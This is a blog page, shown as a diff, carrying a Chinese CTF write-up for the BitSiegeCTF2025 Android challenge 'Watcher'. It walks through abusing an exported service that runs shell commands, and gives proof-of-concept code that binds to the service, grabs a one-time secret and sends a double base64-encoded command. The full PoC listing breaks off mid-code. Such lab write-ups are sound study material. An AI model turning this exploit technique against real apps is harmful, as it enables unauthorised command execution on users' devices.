@@ -1,0 +1,861 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="arch3rn4r">
+    
+    <title>
+        
+            BitSiegeCTF2025-Watcher |
+        
+        arch3rn4r
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/font/css/regular.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/font/css/solid.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/font/css/brands.min.css">
+    
+        
+            
+        
+            
+                
+<link rel="stylesheet" href="/css/custom.css">
+
+            
+        
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"arch3rn4r.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"arch3rn4r","author":"arch3rn4r","avatar":"/images/beauty/myhead.svg"},"menu":{"home":"/                        || fa-solid fa-home","archives":"/archives            || fa-solid fa-box-archive","tags":"/tags                    || fa-solid fa-tags","about":"/about                || fa-solid fa-user-graduate"},"first_screen":{"enable":true,"background_img":"/images/beauty/bg.jpg","background_img_dark":"https://arch3rn4r.github.io/picx-images-hosting/20240915/EYnModKVcAAy6sw.4g4g8oqoi0.webp","description":"这里是雨季，你那里阳光明媚吗","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":true,"hide_header":true},"home":{"announcement":null,"category":false,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":false,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":"ture"},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":true,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default","code_block_shrink":false},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"left"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":false,"page_pv":false}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"giscus","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":null,"reaction":false,"version":"3.2.1"},"giscus":{"repo":"arch3rn4r/arch3rn4r.github.io","repo_id":"R_kgDOLnMFhw","category":"Announcements","category_id":"DIC_kwDOLnMFh84Cik-D","reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":true},"lazyload":{"enable":true},"cdn":{"enable":true,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":true,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":true,"css":[null,"/css/custom.css"],"js":[null]},"root":"","source_data":{},"version":"4.2.3"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.1.1"><link rel="alternate" href="/atom.xml" title="arch3rn4r" type="application/atom+xml">
+</head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+            <a class="site-name border-box" href="/">
+               arch3rn4r
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-home"></i>
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-box-archive"></i>
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-tags"></i>
+                                
+                                标签
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-user-graduate"></i>
+                                
+                                关于
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-home"></i>
+                                </span>
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-box-archive"></i>
+                                </span>
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-tags"></i>
+                                </span>
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-user-graduate"></i>
+                                </span>
+                            
+                            关于
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        BitSiegeCTF2025-Watcher
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/beauty/myhead.svg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">arch3rn4r</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-05-06 14:28:47</span>
+            </span>
+
+            <span class="meta-info-item post-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="datetime" data-updated="Tue May 06 2025 14:49:18 GMT+0800">2025-05-06 14:49:18</span>
+            </span>
+        
+
+        
+
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>2.1k 字</span>
+            </span>
+        
+        
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h2 id="前置分析"><a href="#前置分析" class="headerlink" title="前置分析"></a>前置分析</h2><p>题目描述<br>题目下载链接:<a class="link"   target="_blank" rel="noopener" href="https://github.com/0xbinder/BitCTF-2025/blob/main/watcher.apk" >https://github.com/0xbinder/BitCTF-2025/blob/main/watcher.apk<i class="fas fa-external-link-alt"></i></a><br><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://archernar.oss-cn-guangzhou.aliyuncs.com/test1/Pasted%20image%2020250506084837.png"
+                       
+                 ><br>打开modsf，获取到它的基本信息和暴露的组件<br><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://archernar.oss-cn-guangzhou.aliyuncs.com/test1/Pasted%20image%2020250506084328.png"
+                       
+                 ></p>
+<p>Package Name： com.example.watcher<br>exported services：com.example.watcher.WatcherService</p>
+<p>查看WatcherService的代码，可以发现它里面有命令执行相关的代码，纳米就可以利用它这个暴露的WatcherService来尝试进行命令执行<br>题目要求说的是编写一个app来触发命令执行，接下来就是看具体的交互和代码编写</p>
+<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>打开WatcherService.java,分析代码执行流程<br>主要处理这三个情况</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MSG_ECHO</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MSG_GET_SECRET</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MSG_RUN_COMMAND</span> <span class="operator">=</span> <span class="number">3</span>;</span><br></pre></td></tr></table></figure>
+<p>case3和命令执行相关，里面包含了一个一次性secret的检查，下面是secret相关代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WatcherService.<span class="built_in">this</span>.currentRequestedSecret = UUID.randomUUID().toString();</span><br><span class="line"><span class="type">String</span> <span class="variable">providedSecret</span> <span class="operator">=</span> message.getData().getString(<span class="string">&quot;secret&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (WatcherService.<span class="built_in">this</span>.currentRequestedSecret == <span class="literal">null</span> || !WatcherService.<span class="built_in">this</span>.currentRequestedSecret.equals(providedSecret)) </span><br></pre></td></tr></table></figure>
+<p>如果成功的话，就会执行这个代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">commandOutput</span> <span class="operator">=</span> Handlers.executeCommand(command);</span><br></pre></td></tr></table></figure>
+<p>那么现在点击Handlers来处理命令执行相关的代码<br>它这里有两个判断,如果sdk的版本大于26那么会对传入的数据进行两次base64解码，也就是说我们传入的初始字符要经过两次base64加密后再传入(我使用的sdk是29，所以我需要遵循两次加密)</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= <span class="number">26</span>) &#123;</span><br><span class="line">            singleDecodedCommand = <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getDecoder().decode(doubleEncodedCommand));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= <span class="number">26</span>) &#123;</span><br><span class="line">            command = <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getDecoder().decode(singleDecodedCommand));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>解密没有问题后就会开始执行代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(command);</span><br></pre></td></tr></table></figure>
+
+<p>为什么以API26为界限呢<br>因为java.util.Base64是在 Android API 级别 26 (Android 8.0 Oreo) 才被正式引入并保证可用的。API26之前是使用android.util.Base64。<br>在这题中没有处理API26之后的情况，如果是API26之后，解码步骤会被跳过，command会为null,程序无法执行</p>
+<h2 id="编写poc"><a href="#编写poc" class="headerlink" title="编写poc"></a>编写poc</h2><p><a class="link"   target="_blank" rel="noopener" href="https://developer.android.com/reference/android/os/IBinder" >IBinder<i class="fas fa-external-link-alt"></i></a> 是一个<strong>通信接口</strong>，定义了外部应用可以如何与该 Service 交互,onBind 返回了 messenger.getBinder()。外部应用拿到这个 IBinder 后，就可以创建一个 Messenger 对象，从而能够向 WatcherService 的 IncomingHandler 发送 Message。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> IBinder <span class="title function_">onBind</span><span class="params">(Intent intent)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.messenger.getBinder();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="连接service"><a href="#连接service" class="headerlink" title="连接service"></a>连接service</h3><p>进行连接<br><a class="link"   target="_blank" rel="noopener" href="https://developer.android.com/develop/background-work/services/bound-services?hl=zh-cn#bind-started-service" >绑定到目标service<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onStart</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();  </span><br><span class="line">    <span class="comment">//绑定目标app和目标服务</span></span><br><span class="line">    intent.setComponent(<span class="keyword">new</span> <span class="title class_">ComponentName</span>(TARGET_PACKAGE, TARGET_SERVICE));  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        bindService(intent, mConnection, Context.BIND_AUTO_CREATE);</span><br><span class="line">        <span class="comment">//BIND_AUTO_CREATE:只要存在绑定，就自动创建服务。</span></span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>客户端通过调用 bindService() 绑定到服务。调用时，它必须提供 ServiceConnection 的实现，后者会监控与服务的连接。调用 bindService() 指示 请求的服务是否存在，以及是否允许客户端访问该服务。<br>时间 Android 系统会在客户端与服务之间创建连接， 致电 onServiceConnected() （在 ServiceConnection 上）。通过 onServiceConnected() 方法包含 IBinder 参数，客户端随后会使用该参数与绑定服务进行通信。</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://developer.android.com/reference/android/content/ServiceConnection" >处理连接<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="type">ServiceConnection</span> <span class="variable">mConnection</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServiceConnection</span>() &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onServiceConnected</span><span class="params">(ComponentName name, IBinder service)</span> &#123;</span><br><span class="line">    <span class="comment">//name:服务已连接的组件的具体名称。</span></span><br><span class="line">    <span class="comment">//service:服务通信通道的 IBinder，您现在可以对其进行调用。</span></span><br><span class="line">    mServiceMessenger = <span class="keyword">new</span> <span class="title class_">Messenger</span>(service);</span><br><span class="line">    <span class="comment">//WatcherService 使用 Messenger 进行通信，并且它的 onBind 返回的是其内部 Messenger 的 Binder (messenger.getBinder())。所以，我们用 WatcherService 返回的这个 IBinder (service) 来创建一个新的 Messenger 对象 (mServiceMessenger)。这个 mServiceMessenger 现在就指向了 WatcherService 内部的 IncomingHandler，可以用来向 WatcherService发送消息了。</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onServiceDisconnected</span> <span class="params">(ComponentName name)</span>&#123;</span><br><span class="line">	<span class="comment">//name:该服务的具体组件名称，其连接已丢失。</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="处理一次性secret"><a href="#处理一次性secret" class="headerlink" title="处理一次性secret"></a>处理一次性secret</h3><p>请求secret</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Message</span> <span class="variable">getSecretMsg</span> <span class="operator">=</span> Message.obtain(<span class="literal">null</span>, MSG_GET_SECRET); </span><br><span class="line"><span class="comment">//Handler h:null:在创建要跨进程发送的消息时，源 Handler 通常设为 null。</span></span><br><span class="line"><span class="comment">//int what:MSG_GET_SECRET</span></span><br><span class="line">getSecretMsg.replyTo = mReplyMessenger;  </span><br><span class="line"><span class="keyword">try</span> &#123;  </span><br><span class="line">    mServiceMessenger.send(getSecretMsg);  </span><br><span class="line">    <span class="comment">//向WatcherService发送信息，最终WatcherService的 public void handleMessage(Message message)处理信息</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>存储secret<br>mReplyMessenger用ReplyHandler处理回复的信息</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">reply</span> <span class="operator">=</span> msg.getData() != <span class="literal">null</span> ? msg.getData().getString(KEY_REPLY) : <span class="literal">null</span>;</span><br><span class="line"><span class="comment">//匹配键值对（在watcherservice的sendReply设置）提取reply（回复的信息）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (msg.what) &#123;  </span><br><span class="line">    <span class="keyword">case</span> MSG_GET_SECRET:</span><br><span class="line">	    mReceivedSecret = reply;</span><br><span class="line">	    <span class="comment">//保存回复的信息（一次性secret)</span></span><br><span class="line">	    sendCommand();</span><br><span class="line">	    <span class="comment">//并且就在这里马上进行执行指令，因为这个口令是一次性的，每次请求都不一样</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="发送指令"><a href="#发送指令" class="headerlink" title="发送指令"></a>发送指令</h3><p>准备指令</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;id&quot;</span>; <span class="comment">// The command to execute  </span></span><br><span class="line"><span class="type">String</span> <span class="variable">doubleEncodedCommand</span> <span class="operator">=</span> doubleEncodeBase64(command);</span><br><span class="line"><span class="comment">//进行两次base64加密，对应handler的两次base64解码</span></span><br><span class="line"></span><br><span class="line">bundle.putString(KEY_SECRET, mReceivedSecret);  </span><br><span class="line">bundle.putString(KEY_COMMAND, doubleEncodedCommand);</span><br><span class="line">runCmdMsg.setData(bundle);</span><br><span class="line"><span class="comment">//准备对象池，设立键值对，需要一次性secret和目标command</span></span><br></pre></td></tr></table></figure>
+
+<p>进行指令的发送并处理消息回复</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">runCmdMsg.replyTo = mReplyMessenger;</span><br><span class="line">mServiceMessenger.send(runCmdMsg);</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="完整的MainActivity-java"><a href="#完整的MainActivity-java" class="headerlink" title="完整的MainActivity.java"></a>完整的MainActivity.java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.watchpoc;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> android.content.ComponentName;  </span><br><span class="line"><span class="keyword">import</span> android.content.Context;  </span><br><span class="line"><span class="keyword">import</span> android.content.Intent;  </span><br><span class="line"><span class="keyword">import</span> android.content.ServiceConnection;  </span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;  </span><br><span class="line"><span class="keyword">import</span> android.os.Handler;  </span><br><span class="line"><span class="keyword">import</span> android.os.IBinder;  </span><br><span class="line"><span class="keyword">import</span> android.os.Looper;  </span><br><span class="line"><span class="keyword">import</span> android.os.Message;  </span><br><span class="line"><span class="keyword">import</span> android.os.Messenger;  </span><br><span class="line"><span class="keyword">import</span> android.os.RemoteException;  </span><br><span class="line"><span class="keyword">import</span> android.util.Log;  </span><br><span class="line"><span class="keyword">import</span> android.widget.Button;  </span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;  </span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;  </span><br><span class="line"><span class="keyword">import</span> java.util.Base64; <span class="comment">// Requires API 26+  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;MinimalPOC&quot;</span>;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TARGET_PACKAGE</span> <span class="operator">=</span> <span class="string">&quot;com.example.watcher&quot;</span>; <span class="comment">// Target App  </span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TARGET_SERVICE</span> <span class="operator">=</span> <span class="string">&quot;com.example.watcher.WatcherService&quot;</span>; <span class="comment">// Target Service  </span></span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Message codes from WatcherService    private static final int MSG_GET_SECRET = 2;  </span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MSG_RUN_COMMAND</span> <span class="operator">=</span> <span class="number">3</span>;  </span><br><span class="line">    <span class="comment">// Bundle keys from WatcherService  </span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span 